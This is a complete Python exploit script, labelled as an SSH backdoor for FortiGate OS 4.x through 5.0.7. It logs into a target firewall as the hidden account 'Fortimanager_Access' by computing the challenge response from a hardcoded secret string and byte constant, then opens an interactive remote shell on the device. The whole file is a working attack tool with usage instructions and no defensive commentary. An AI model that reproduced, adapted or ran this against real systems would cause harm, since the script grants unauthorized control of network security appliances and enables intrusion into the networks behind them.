#!/usr/bin/env python

# SSH Backdoor for FortiGate OS Version 4.x up to 5.0.7
# Usage: ./fgt_ssh_backdoor.py <target-ip>

import socket
import select
import sys
import paramiko
from paramiko.py3compat import u
import base64
import hashlib
import termios
import tty

def custom_handler(title, instructions, prompt_list):
    n = prompt_list[0][0]
    m = hashlib.sha1()
    m.update('\x00' * 12)
    m.update(n + 'FGTAbc11*xy+Qqz27')
    m.update('\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70')
    h = 'AK1' + base64.b64encode('\x00' * 12 + m.digest())
    return [h]


def main():
    if len(sys.argv) < 2:
        print 'Usage: ' + sys.argv[0] + ' <target-ip>'
        exit(-1)

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(sys.argv[1], username='', allow_agent=False, look_for_keys=False)
    except paramiko.ssh_exception.SSHException:
        pass

    trans = client.get_transport()
    try:
        trans.auth_password(username='Fortimanager_Access', password='', event=None, fallback=True)
    except paramiko.ssh_exception.AuthenticationException:
        pass

    trans.auth_interactive(username='Fortimanager_Access', handler=custom_handler)
    chan = client.invoke_shell()

    oldtty = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        tty.setcbreak(sys.stdin.fileno())
        chan.settimeout(0.0)

        while True:
            r, w, e = select.select([chan, sys.stdin], [], [])
            if chan in r:
                try:
                    x = u(chan.recv(1024))
                    if len(x) == 0:
                        sys.stdout.write('\r\n*** EOF\r\n')
                        break
                    sys.stdout.write(x)
                    sys.stdout.flush()
                except socket.timeout:
                    pass
            if sys.stdin in r:
                x = sys.stdin.read(1)
                if len(x) == 0:
                    break
                chan.send(x)

    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)


if __name__ == '__main__':
    main()